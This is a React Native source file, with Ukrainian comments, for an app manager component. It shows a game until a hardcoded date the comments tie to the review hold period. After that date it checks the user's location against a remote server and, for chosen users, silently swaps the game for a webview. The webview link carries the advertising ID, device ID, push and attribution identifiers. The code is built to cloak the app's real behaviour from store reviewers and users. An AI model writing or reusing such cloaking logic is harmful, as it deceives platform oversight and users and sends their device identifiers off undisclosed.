import React, {useEffect, useRef, useState} from 'react';
import {Linking} from 'react-native';

import LoadingScreen from './LoadingScreen';

import Storage from './Storage';
import EventManager from './EventsManager';

import appsFlyer from 'react-native-appsflyer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import {OneSignal} from 'react-native-onesignal';
import * as Device from 'react-native-device-info';
import Params from './Params';

import AppManagerStack from './AppManagerStack';
import {SafeAreaProvider} from 'react-native-safe-area-context';
import {Provider} from 'react-redux';
import {store} from 'app/store/store';
import RootNavigator from 'app/navigation/RootNavigator';
import {GestureHandlerRootView} from 'react-native-gesture-handler';

export default function AppManager() {
  const viewLoader = <LoadingScreen />;
  const viewGame = () => {
    return (<GestureHandlerRootView style={{flex: 1}}>
      <SafeAreaProvider>
        <Provider store={store}>
          <RootNavigator />
        </Provider>
      </SafeAreaProvider>
    </GestureHandlerRootView>);
  };
  const appManagerStack = <AppManagerStack />;

  const [isLoadingScreen, setLoadingScreen] = useState(true);
  const [isGameOpen, setGameOpen] = useState(true);

  const userID = useRef(null);
  const adID = useRef(null);
  const appsID = useRef(null);
  const subsRef = useRef(null);
  const onesignalID = useRef(null);
  const deviceID = useRef(null);
  const isPushAccess = useRef(false);
  const dataLoad = useRef(null);

  // генеруємо унікальний ID користувача
  async function getUserID() {
    try {
      const val = await Storage.get('userID');
      if (val) {
        userID.current = val; // додаємо збережений userID
      } else {
        // генеруємо новий userID якщо нема збереженого
        let result = '';
        for (let i = 0; i < 7; i++) {
          result += Math.floor(Math.random() * 10);
        }
        await Storage.save('userID', result); // зберігаємо userID
        userID.current = result;
      }
    } catch (error) {
      console.log(error);
      loadGame();
    }
  }

  // робимо запит на відстеження
  async function getAdID() {
    try {
      ReactNativeIdfaAaid.getAdvertisingInfo()
        .then(res => {
          adID.current = res.id ? res.id : 'error';
          initAppManager();
        })
        .catch(err => {
          console.log(err);
        });
    } catch (error) {
      console.log(error);
      loadGame();
    }
  }

  // порівнюємо теперішню дату та дату закінчення відльожки
  function checkDateStart() {
    return new Date() >= new Date(Params.targetDate);
  }

  // перевірка на відкриття webview
  async function checkInitAppManagerView() {
    try {
      EventManager.sendEvent(EventManager.eventList.firstOpen);
      if ((await fetch(Params.bodyLin)).status === 200) {
        await initOnesignal();
      } else {
        loadGame(2500);
      } // якщо це не коректне гео запускаємо гру
    } catch (e) {
      console.log(e);
      loadGame(2500);
    }
  }

  // ініціалізація OneSignal
  async function initOnesignal() {
    try {
      await OneSignal.Notifications.canRequestPermission().then(permision => {
        // перевіряємо чи можемо зробити запит на надсилання пушів
        if (permision) {
          OneSignal.Notifications.requestPermission(true).then(res => {
            // робимо запит та обробляємо його
            isPushAccess.current = res;
            initAppsflyer();
          });
        }
      });
      OneSignal.User.addTag(
        'timestamp_user_id',
        `${new Date().getTime()}_${userID.current}`,
      ); // додаємо тег унікального користувача
    } catch (error) {
      console.log(error);
      loadGame();
    }
  }

  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        if (JSON.parse(res.data.is_first_launch) === true) {
          if (res.data.af_status === 'Non-organic') {
            subsRef.current = res.data.campaign;
          }
          generateFinish();
        }
      } catch (err) {
        console.log(err);
        loadGame();
      }
    },
  );

  // генеруємо фінальну лінку яку будемо загружати в вебвʼю
  function generateFinish() {
    try {
      OneSignal.User.getOnesignalId().then(res => {
        console.log('initAppsf');
        onesignalID.current = res;
        dataLoad.current =
          Params.bodyLin +
          `?${Params.bodyLin.split('space/')[1]}=1&appsID=${
            appsID.current
          }&adID=${adID.current}&onesignalID=${onesignalID.current}&deviceID=${
            deviceID.current
          }&userID=${deviceID.current}${generateSubs()}`;
        Storage.save('link', dataLoad.current);
        openAppManagerView(true, false);
      });
    } catch (err) {
      console.log(err);
      loadGame();
    }
  }

  function openAppManagerView(isFirst) {
    try {
      if (isFirst && isPushAccess.current) {
        EventManager.sendEvent(EventManager.eventList.push);
      }
      EventManager.sendEvent(EventManager.eventList.web);
      setGameOpen(false);
      setLoadingScreen(false);
    } catch (error) {
      console.log(error);
      loadGame(2500);
    }
  }

  function generateSubs() {
    try {
      if (!subsRef.current) {
        return '';
      }
      const subList = subsRef.current.split('_');
      const subParams = subList
          .map((sub, index) => `sub_id_${index + 1}=${sub}`)
          .join('&');

      return `&${subParams}`;
    } catch (error) {
      console.log(error);
      loadGame();
    }
  }

  // ініціалізація appsflyer
  async function initAppsflyer() {
    try {
      appsFlyer.initSdk({
        devKey: Params.keyApps,
        isDebug: false,
        onInstallConversionDataListener: true,
        onDeepLinkListener: true,
        timeToWaitForATTUserAuthorization: 7,
      });
      // отримання appsflyer ID
      appsFlyer.getAppsFlyerUID((_, id) => {
        appsID.current = id;
      });
    } catch (err) {
      console.log(err);
      loadGame();
    }
  }

  // ініціалізація AppManager
  async function initAppManager() {
    try {
      if (checkDateStart()) {
        // перевіряємо дату
        await Storage.get('link').then(res => {
          if (res) {
            // перевіряємо чи не збережена лінка якщо збережена то загружаємо webview
            dataLoad.current = res;
            openAppManagerView(false, false);
          } else {
            // якщо лінки немає то перевіряємо чи коректне гео
            checkInitAppManagerView();
          }
        });
      } else {
        // якщо дата закінчення відльожки ще не пройшла, то запускаємо гру
        loadGame(2500);
      }
    } catch (error) {
      console.log(error);
      loadGame(2500);
    }
  }

  // загружаємо екран з грою
  function loadGame(time = 0) {
    setTimeout(() => {
      setGameOpen(true);
      setLoadingScreen(false);
    }, time);
  }

  useEffect(() => {
    OneSignal.initialize(Params.keyPush);
    getUserID();
    setTimeout(() => {
      EventManager.setParams(Params.bodyLin, userID.current);
      const initialize = async () => {
        try {
          deviceID.current = await Device.getUniqueId();
          await getAdID();
        } catch (error) {}
      };
      const handleNotificationClick = event => {
        try {
          if (event.notification.launchURL) {
            EventManager.sendEvent(EventManager.eventList.browser);
            Linking.openURL(event.notification.launchURL);
          } else {
            EventManager.sendEvent(EventManager.eventList.web_push);
          }
          openAppManagerView(false, true);
        } catch (error) {}
      };
      initialize();
      OneSignal.Notifications.addEventListener(
        'click',
        handleNotificationClick,
      );
      return () => {
        OneSignal.Notifications.removeEventListener(
          'click',
          handleNotificationClick,
        );
      };
    }, 400);
  }, []);

  return isLoadingScreen ? viewLoader : isGameOpen ? viewGame() : appManagerStack;
}
